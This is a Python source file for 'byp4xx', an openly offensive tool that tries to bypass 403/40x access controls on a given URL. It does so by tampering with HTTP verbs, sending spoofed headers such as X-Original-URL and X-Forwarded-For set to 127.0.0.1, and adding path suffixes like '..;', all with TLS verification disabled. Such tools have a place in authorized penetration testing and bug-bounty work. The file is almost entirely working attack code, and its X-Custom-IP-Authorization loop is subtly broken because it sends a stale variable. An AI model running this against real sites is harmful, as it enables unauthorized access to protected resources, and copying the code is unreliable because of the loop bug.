#!/usr/bin/python3
import argparse
import requests
import sys
import os
from requests.exceptions import Timeout
from urllib.parse import urlparse
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

# We're making insecure HTTPS requests. This silences warnings in the output
disable_warnings(InsecureRequestWarning)


def banner():
	print('\033[92m    __                 \033[91m__ __           ')
	print('\033[92m   / /_  __  ______   \033[91m/ // / _  ___  __')
	print('\033[92m  / __ \/ / / / __ \ \033[91m/ // /_| |/_/ |/_/')
	print('\033[92m / /_/ / /_/ / /_/ /\033[91m/__  __/>  <_>  <  ')
	print('\033[92m/_.___/\__, / .___/   \033[91m/_/ /_/|_/_/|_|  ')
	print('\033[92m      /____/_/                        ')
	print('by: @lobuhisec \033[0m')
	print('')

def do_request(url, verb='HEAD', headers={}, payload=''):
	"""Performs the request to the server via requests.
	Global variables are used to access data populated by command-line flags.
	"""
	global proxies
	global redirects
	global timeout
	global verbose
	# Custom verbs: https://2.python-requests.org/projects/3/user/advanced/#custom-verbs
	try:
		res = requests.request(
			verb, 
			url, 
			headers=headers, 
			proxies=proxies, 
			data=payload, 
			verify=False, 
			timeout=timeout, 
			allow_redirects=False
		)
	except Timeout as e:
		print(f'ERROR: Request timed out. `{e}`')
		return
	code = str(res.status_code)

	#200=GREEN
	if code == "200":
		code = "\033[92m"+code+"\033[0m"
	#30X=ORANGE
	elif code.startswith("30"):
		code = "\033[93m"+code+" TIP: Consider to use --allow-redirects option to follow redirections\033[0m"
	#40X or 50X=RED
	elif code.startswith("40") or code.startswith("50"):
		code = "\033[91m"+code+"\033[0m"
	return code

def make_abs_path(filename):
	"""Generates the full, absolute, real path to a file. This will allow the script to work
	across symlinks.
	"""
	return os.path.join(os.path.abspath(os.path.dirname(os.path.realpath(__file__))), filename)

def main():
	parser = argparse.ArgumentParser(description='')
	parser.add_argument('target', metavar='target',
			help='The target host to scan')
#	parser.add_argument('target_file', metavar='target-file',
#			help='The list of in-scope hosts to scan')
#	parser.add_argument('--manual-launch', default=False, action='store_true',
#			help='If supplied, the script will create the scan but will not launch it.')
	#Check all params
	global proxies
	proxies = {}
	global timeout
	timeout = 10

	args = parser.parse_args()
	if len(sys.argv)<2:
		print("Usage: ./byp4xx <target>")
		sys.exit(1)

	#Check if URL starts with http/https
	if not args.target.startswith("http"):
		print("Usage: ./byp4xx <target>")	
		print("URL parameter does not start with http:// or https://")
		sys.exit(1)

	"""Parse basic URL and path from target parameter. 
		e.g. for host https://site.com/foo
			base 	 	= https://site.com
			endpoint 	= /foo
			full_target 	= https://site.com/foo

	See: https://docs.python.org/3/library/urllib.parse.html
	"""
	parsed = urlparse(args.target)
	base = f"{parsed.scheme}://{parsed.netloc}"
	endpoint = parsed.path
	full_target = base + endpoint

	########### TESTS start here!!!!
	with open(make_abs_path('verbs.txt'), 'r') as f:
		verbs = f.readlines()
		verbs = [x.strip() for x in verbs]
	print('\033[92m\033[1m[+]VERB TAMPERING\033[0m')
	for verb in verbs:
		print(f"{verb}: {do_request(verb=verb, url=full_target)}")
	print("")

	###########HEADERS
	headers = {
		'Referer': 			full_target,
		'X-Original-URL':		endpoint,
		'X-Rewrite-URL':		endpoint,
		'X-Originating-IP':		'127.0.0.1',
		'X-Forwarded-For':		'127.0.0.1',
		'X-Remote-IP':			'127.0.0.1',
		'X-Client-IP':			'127.0.0.1',
		'X-Host':			'127.0.0.1',
		'X-Forwarded-Host':		'127.0.0.1'
	}
	print('\033[92m\033[1m[+]HEADERS\033[0m')
	for header, value in headers.items():
		print(f"{header}: {value} {do_request(url=full_target, headers={header: value})}")

	# Do this header separately because we want to try two different values
	# If added to a dictionary, one value will clobber the other.
	# There's probably a cleaner way to do this.
	header = 'X-Custom-IP-Authorization'
	values = [
		full_target + '..;',
		'127.0.0.1',
	]
	for values in values:
		print(f"{header}: {value} {do_request(url=full_target, headers={header: value})}")

	print("")
#	print("Referer: ",curl_code_response(options+" -X GET -H \"Referer: "+payload+"\"",payload))
#	print("X-Custom-IP-Authorization: ",curl_code_response(options+" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",payload))
#	payload=url+"/"+uri+"..\;"
#	print("X-Custom-IP-Authorization + ..;: ",curl_code_response(options+" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",payload))
#	payload=url+"/"
#	print("X-Original-URL: ",curl_code_response(options+" -X GET -H \"X-Original-URL: /"+uri+"\"",payload))
#	print("X-Rewrite-URL: ",curl_code_response(options+" -X GET -H \"X-Rewrite-URL: /"+uri+"\"",payload))
#	payload=url+"/"+uri
#	print("X-Originating-IP: ",curl_code_response(options+" -X GET -H \"X-Originating-IP: 127.0.0.1\"",payload))
#	print("X-Forwarded-For: ",curl_code_response(options+" -X GET -H \"X-Forwarded-For: 127.0.0.1\"",payload))
#	print("X-Remote-IP: ",curl_code_response(options+" -X GET -H \"X-Remote-IP: 127.0.0.1\"",payload))
#	print("X-Client-IP: ",curl_code_response(options+" -X GET -H \"X-Client-IP: 127.0.0.1\"",payload))
#	print("X-Host: ",curl_code_response(options+" -X GET -H \"X-Host: 127.0.0.1\"",payload))
#	print("X-Forwarded-Host: ",curl_code_response(options+" -X GET -H \"X-Forwarded-Host: 127.0.0.1\"",payload))
	###########BUGBOUNTY
	print('\033[92m\033[1m[+]#BUGBOUNTYTIPS\033[0m')
	suffixes = [
		'/.',
		'?',
		'??',
		'//',
		'/',
		'.randomstring',
		'..;'
	]
	for suffix in suffixes:
		print(f"Ends with {suffix}: {do_request(url=full_target+suffix)}")
	betweens = [
		'/.',
		'/.;',
		';foo=bar;'
	]
	for between in betweens:
		try: 
			print(f"Between {between}: ", end='')
			print(do_request(url=(base + between + endpoint)))
		except Exception as e:
			print(f"None")
	#payload=url+"/%2e/"+uri
	#print("%2e: ",curl_code_response(options+" -X GET",payload))
	#payload=url+"/"+uri+"/."
	#print("Ends with /.: ",curl_code_response(options+" -X GET --path-as-is",payload))
	#payload=url+"/"+uri+"?"
	#print("Ends with ?: ",curl_code_response(options+" -X GET",payload))
	#payload=url+"/"+uri+"??"
	#print("Ends with ??: ",curl_code_response(options+" -X GET",payload))
	#payload=url+"/"+uri+"//"
	#print("Ends with //: ",curl_code_response(options+" -X GET",payload))
	#payload=url+"/./"+uri+"/./"
	#print("Between /./: ",curl_code_response(options+" -X GET --path-as-is",payload))
	#payload=url+"/"+uri+"/"
	#print("Ends with /: ",curl_code_response(options+" -X GET",payload))
	#payload=url+"/"+uri+"/.randomstring"
	#print("Ends with .randomstring: ",curl_code_response(options+" -X GET",payload))
	#payload=url+"/"+uri+"..\;/"
	#print("Ends with ..;: ",curl_code_response(options+" -X GET --path-as-is",payload))
	#payload=url+"/.\;/"+uri
	#print("Between /.;/: ",curl_code_response(options+" -X GET --path-as-is",payload))
	#payload=url+"\;foo=bar/"+uri
	#print("Between ;foo=bar;/: ",curl_code_response(options+" -X GET --path-as-is",payload))
	print("")
	###########UserAgents
	# TODO
	#payload=url+"/"+uri
	#response=input("Do you want to try with UserAgents.fuzz.txt from SecList? (2454 requests) [y/N]: ")
	#if response.lower() != 'y':
	#	sys.exit(1)
	#else:
	#	print('\033[92m\033[1m[+]UserAgents\033[0m')
	#	with open("UserAgents.fuzz.txt") as file:  
	#		for line in file:
	#			print(line.strip()+":"+curl_code_response(options+" -X GET -H \"User-Agent: "+line.strip()+"\"",payload))


if __name__ == "__main__":
	try:
		banner()
		main()
	except KeyboardInterrupt:
		print("Aborting...")
	except Exception as e:
		print(e)
